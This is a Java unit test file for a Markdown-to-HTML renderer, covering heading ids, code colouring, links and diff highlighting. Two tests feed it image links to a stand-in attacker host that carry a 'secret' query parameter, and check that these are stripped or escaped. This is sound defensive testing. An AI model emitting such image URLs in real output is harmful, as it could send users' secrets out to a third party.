package dev.marregui.comando.ui.kit.text;

import dev.marregui.comando.ui.kit.theme.Theme;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;

class MarkdownHtmlTest {

    @Test
    void aHeadingHasTheIdGitHubGivesIt() {
        assertThat(MarkdownHtml.render("## 3. Decisions")).contains("<h2 id=\"3-decisions\">3. Decisions</h2>");
        assertThat(MarkdownHtml.render("# The `LocalImages` class")).contains("<h1 id=\"the-localimages-class\">");
        assertThat(MarkdownHtml.render("### **Bold** _it_ [a link](x.md)")).contains("<h3 id=\"bold-it-a-link\">");
        assertThat(MarkdownHtml.render("## Café & crème: what's left?")).as("letters of any language kept, each space a hyphen")
                .contains("id=\"café--crème-whats-left\"");
        assertThat(MarkdownHtml.render("## snake_case and kebab-case")).contains("id=\"snake_case-and-kebab-case\"");
        assertThat(MarkdownHtml.render("Setext title\n============")).contains("<h1 id=\"setext-title\">");
        assertThat(MarkdownHtml.render("## A\n\n## A\n\n## A-1\n\n## A")).as("a taken id counts on, as GitHub's")
                .contains("id=\"a\"", "id=\"a-1\"", "id=\"a-1-1\"", "id=\"a-2\"");
        assertThat(MarkdownHtml.render("## Notes", null, MarkdownHtml.Pictures.NONE)).as("every renderer")
                .contains("id=\"notes\"");
        assertThat(MarkdownHtml.render("## Notes")).as("ids count from the top of each document").contains("id=\"notes\"");
        assertThat(MarkdownHtml.render("a paragraph")).doesNotContain("id=");
    }

    @Test
    void anImageBecomesItsAltTextAndItsUrlIsNotRendered() {
        String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
        assertThat(html).doesNotContain("<img").doesNotContain("attacker.example").contains("<i>status of x</i>");
    }

    @Test
    void rawHtmlImagesAreEscaped() {
        assertThat(MarkdownHtml.render("<img src=\"https://attacker.example/p.png\">")).doesNotContain("<img");
    }

    @Test
    void aCodeBlockTakesTheEditorsColoursForItsLanguage() {
        String html = MarkdownHtml.render("```java\nreturn \"<b>\";\n```\n");
        assertThat(html).contains("<pre class=\"code\"><code>")
                .contains("<font color=\"#cf8e6d\">return</font>")
                .contains("<font color=\"#6aab73\">\"&lt;b&gt;\"</font>")
                .doesNotContain("<b>");
    }

    @Test
    void aCodeBlockWithoutALanguageIsPlainAndEscaped() {
        assertThat(MarkdownHtml.render("```\n<script>x</script>\n```\n"))
                .contains("<pre class=\"code\"><code>&lt;script&gt;x&lt;/script&gt;\n</code></pre>")
                .doesNotContain("<font");
    }

    @Test
    void linksStayLinks() {
        assertThat(MarkdownHtml.render("[docs](https://example.org/a)")).contains("href=\"https://example.org/a\">docs</a>");
    }

    @Test
    void marksShadeTheChangedBlocksAndTheirChangedWordsAsAComparisonDoes() {
        String md = "# Title\n\nFirst para.\n\nSecond para has words.\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```java\nint x;\n```\n";
        int word = md.indexOf("words");
        MarkdownHtml.Marks marks = new MarkdownHtml.Marks(Set.of(4, 7, 11, 14), List.of(new int[] {word, word + 5}), true);
        String html = MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, marks);
        String line = "background-color: " + Theme.hex(Theme.DIFF_ADDED);
        String strong = "background-color: " + Theme.hex(Theme.DIFF_ADDED_WORD);
        assertThat(html).contains("<p style=\"" + line + "\">Second para has <span style=\"" + strong + "\">words</span>.</p>")
                .contains("<li style=\"" + line + "\">b</li>", "<li>a</li>", "<p>First para.</p>", ">Title</h1>")
                .contains("<td style=\"" + line + "\">1</td>", "<td style=\"" + line + "\">2</td>")
                .contains("<pre class=\"code\" style=\"" + line + "\">");

        String older = MarkdownHtml.render("Gone\n", null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(0), List.of(), false));
        assertThat(older).as("the older side in red").contains("<p style=\"background-color: " + Theme.hex(Theme.DIFF_REMOVED) + "\">Gone</p>");
        assertThat(MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, MarkdownHtml.Marks.NONE))
                .as("no marks: as ever").isEqualTo(MarkdownHtml.render(md));
    }
}
